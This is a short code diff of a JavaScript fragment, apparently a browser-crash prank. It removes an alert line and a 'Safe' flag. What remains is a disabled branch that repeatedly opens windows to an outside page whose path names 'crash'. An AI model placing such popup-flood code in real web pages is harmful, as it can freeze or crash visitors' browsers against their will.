@@ -1,6 +1,4 @@
-alert("yes")
 var shutdown = false
-var Safe = true
 if(shutdown==true){
 window.open("http://www.newdream.net/crash/js2.html")
 window.open("http://www.newdream.net/crash/js2.html")
